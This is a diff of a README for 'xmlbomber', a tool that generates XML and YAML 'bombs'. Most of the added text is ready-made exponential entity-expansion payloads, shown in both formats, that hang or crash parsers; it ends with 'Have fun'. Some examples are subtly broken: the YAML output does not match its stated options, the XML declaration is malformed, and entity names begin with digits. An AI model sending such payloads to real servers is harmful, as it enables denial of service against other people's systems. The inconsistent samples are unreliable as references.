@@ -1,4 +1,45 @@
-# xmlbomber
-Script to create a XML bomb
+***
 
-An XML bomb is a piece of XML code that is syntactically valid and correct but can cause a program that compiles or runs it to crash or hang. An XML bomb can be used to test the security level of a server. In an HTML code, an XML code is either parsed internally or referenced as an external file that is sent to a server. Typically, a normal server without adequate protection is expected to crash with this attack.
+<h1 align="center">
+	<b>xmlbomber</b>
+</h1>
+<h3 align="center">
+	<i>script to create a XML or YAML bomb</i>
+</h3>
+
+Example:  
+``` 
+$ xmlbomber.py -e 7 -r 12 -n "hi" -c "boom" xml
+```
+```xml
+<?xml version="1.0">
+<!DOCTYPE hi [
+  <!ENTITY 0 "boom">
+  <!ENTITY 1 "&0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0">
+  <!ENTITY 2 "&1; &1; &1; &1; &1; &1; &1; &1; &1; &1; &1; &1">
+  <!ENTITY 3 "&2; &2; &2; &2; &2; &2; &2; &2; &2; &2; &2; &2">
+  <!ENTITY 4 "&3; &3; &3; &3; &3; &3; &3; &3; &3; &3; &3; &3">
+  <!ENTITY 5 "&4; &4; &4; &4; &4; &4; &4; &4; &4; &4; &4; &4">
+  <!ENTITY 6 "&5; &5; &5; &5; &5; &5; &5; &5; &5; &5; &5; &5">
+  <!ENTITY 7 "&6; &6; &6; &6; &6; &6; &6; &6; &6; &6; &6; &6">
+  <!ENTITY start "&7;">
+]>
+<hi>&start;</hi>
+```
+***
+```
+$ xmlbomber.py -e 5 -r 7 -c "boom" yaml
+```
+```yaml
+0: &0 ["boom", "boom", "boom", "boom", "boom", "boom", "boom", "boom", "boom", "boom", "boom", "boom"]
+1: &1 [*0, *0, *0, *0, *0, *0, *0, *0, *0, *0, *0, *0]
+2: &2 [*1, *1, *1, *1, *1, *1, *1, *1, *1, *1, *1, *1]
+3: &3 [*2, *2, *2, *2, *2, *2, *2, *2, *2, *2, *2, *2]
+4: &4 [*3, *3, *3, *3, *3, *3, *3, *3, *3, *3, *3, *3]
+5: &5 [*4, *4, *4, *4, *4, *4, *4, *4, *4, *4, *4, *4]
+6: &6 [*5, *5, *5, *5, *5, *5, *5, *5, *5, *5, *5, *5]
+7: &7 [*6, *6, *6, *6, *6, *6, *6, *6, *6, *6, *6, *6]
+
+```
+
+### Have fun
